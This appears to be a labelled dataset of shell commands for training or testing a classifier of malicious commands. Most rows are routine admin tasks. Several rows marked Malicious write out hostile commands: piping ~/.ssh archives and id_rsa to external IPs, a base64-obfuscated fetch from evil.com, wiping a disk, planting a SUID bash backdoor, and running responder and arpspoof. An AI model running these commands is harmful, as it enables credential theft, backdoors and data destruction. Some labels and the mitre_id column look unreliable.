command,label,original_label,mitre_id
sudo tcpdump -i eth0 port 80 -c 100 -w /tmp/capture.pcap,Benign,ContextAugment,ContextAugment
rsync -avz /var/log/ backup@10.0.0.90:/var/backups/host-logs/,Benign,ContextAugment,ContextAugment
"nmap -p 22,80,443,445 192.168.1.20",Context_Dependent,ContextAugment,ContextAugment
ssh -L 9130:internal-api.company.local:443 dba@audit-box,Benign,ContextAugment,ContextAugment
rsync -avz /etc/ssh test@192.168.10.15:/tmp/stage/ 2>/dev/null,Context_Dependent,ContextAugment,ContextAugment
"nmap -p 22,80,443,445 192.168.10.15",Context_Dependent,ContextAugment,ContextAugment
find /home -name authorized_keys 2>/dev/null,Context_Dependent,ContextAugment,ContextAugment
ssh -L 9975:internal-api.company.local:8443 ci@jump.internal,Benign,ContextAugment,ContextAugment
"socat TCP-LISTEN:9443,reuseaddr,fork TCP:10.0.0.1:443",Context_Dependent,ContextAugment,ContextAugment
rsync -avz /root/.ssh test@10.0.0.5:/tmp/stage/ 2>/dev/null,Malicious,ContextAugment,ContextAugment
tar cz /home/*/.ssh 2>/dev/null | curl -X PUT http://77.88.21.11:8080/store/.ssh.tgz --data-binary @-,Malicious,ContextAugment,ContextAugment
ssh -R 8080:127.0.0.1:8080 ansible@jump.internal,Benign,ContextAugment,ContextAugment
strace -f -p $(pgrep java) -e trace=write -o /tmp/java-write.trace,Benign,ContextAugment,ContextAugment
find /home/dev/.ssh -type f -exec chmod 600 {} +,Benign,ContextAugment,ContextAugment
responder -I eth0 -Fv,Malicious,ContextAugment,ContextAugment
chmod 755 /srv/app/current/bin/start.sh,Benign,ContextAugment,ContextAugment
strace -p $(pgrep nginx) -e trace=network -o /tmp/nginx-net.trace,Benign,ContextAugment,ContextAugment
ssh -L 2705:192.168.10.5:443 dev@192.168.10.5,Context_Dependent,ContextAugment,ContextAugment
scp /root/.ssh/id_rsa user@91.234.56.78:/tmp/ 2>/dev/null,Malicious,ContextAugment,ContextAugment
scp /tmp/status.txt audit@172.16.1.5:/tmp/,Context_Dependent,ContextAugment,ContextAugment
tcpdump -i eth0 -c 50 'port 3306 and host 10.0.0.100',Benign,ContextAugment,ContextAugment
scp /var/log/app/app.log support@ci.internal:/srv/incident-logs/,Benign,ContextAugment,ContextAugment
rsync -avz /var/log/ monitoring@10.0.0.100:/srv/review/host-logs/,Benign,ContextAugment,ContextAugment
systemctl edit --full nginx,Context_Dependent,ContextAugment,ContextAugment
strace -p $(pgrep postgres) -e trace=network -o /tmp/postgres-net.trace,Benign,ContextAugment,ContextAugment
ssh -L 8447:internal-api.company.local:443 backup@backup-server,Benign,ContextAugment,ContextAugment
arpspoof -i eth0 -t 10.0.0.20 172.16.0.10,Malicious,ContextAugment,ContextAugment
tar cz /home/*/.ssh 2>/dev/null | curl -X PUT http://198.51.100.9:8080/store/.ssh.tgz --data-binary @-,Malicious,ContextAugment,ContextAugment
tcpdump -i eth0 -c 200 host 10.0.0.40 -w /tmp/tls-debug.pcap,Benign,ContextAugment,ContextAugment
chisel client 192.168.1.20:8080 R:1080:socks,Context_Dependent,ContextAugment,ContextAugment
find /etc/ssl -maxdepth 2 -type f 2>/dev/null | head -50,Benign,ContextAugment,ContextAugment
"python3 -c ""import base64,os;os.system(base64.b64decode('Y3VybCBodHRwOi8vZXZpbC5jb20vc2g=').decode())""",Malicious,ContextAugment,ContextAugment
wipefs --all /dev/nvme0n1,Malicious,ContextAugment,ContextAugment
tcpdump -i eth0 -c 50 'port 8443 and host 10.0.0.40',Benign,ContextAugment,ContextAugment
python3 -m http.server 8000 --directory /srv/releases/current,Benign,ContextAugment,ContextAugment
ltrace -p $(pgrep redis-server) -o /tmp/redis-server-debug.ltrace,Benign,ContextAugment,ContextAugment
wget -q https://mirror.internal/python-3.11.9.tgz -O /tmp/python.tgz,Benign,ContextAugment,ContextAugment
ssh -D 3128 ansible@jump.internal,Benign,ContextAugment,ContextAugment
scp /var/log/app/app.log sre@jump.internal:/var/backups/,Benign,ContextAugment,ContextAugment
ltrace -p $(pgrep postgres),Context_Dependent,ContextAugment,ContextAugment
strace -f -p $(pgrep apache2) -e trace=write -o /tmp/apache2-write.trace,Benign,ContextAugment,ContextAugment
ssh -L 1246:192.168.10.5:9200 root@192.168.10.5,Context_Dependent,ContextAugment,ContextAugment
rsync -avz /var/log/nginx/ ops@deploy.corp:/srv/forensics/nginx-logs/,Benign,ContextAugment,ContextAugment
curl -s https://ifconfig.me,Benign,ContextAugment,ContextAugment
cp /bin/bash /tmp/.backdoor && chmod u+s /tmp/.backdoor,Malicious,ContextAugment,ContextAugment
ssh -D 9050 test@10.0.0.5,Context_Dependent,ContextAugment,ContextAugment
ssh -L 9561:internal-api.company.local:8080 deploy@bastion,Benign,ContextAugment,ContextAugment
ssh -L 3565:10.0.0.40:443 test@10.0.0.40,Context_Dependent,ContextAugment,ContextAugment
ssh -R 3306:127.0.0.1:3306 ci@log-collector,Benign,ContextAugment,ContextAugment
python3 -m http.server 0.0.0.0 9000 --directory /srv/releases/current,Benign,ContextAugment,ContextAugment
"mount -o remount,rw /",Context_Dependent,ContextAugment,ContextAugment
scp /etc/ssl/certs/company.pem support@192.168.100.2:/srv/review/cert-audit/,Benign,ContextAugment,ContextAugment
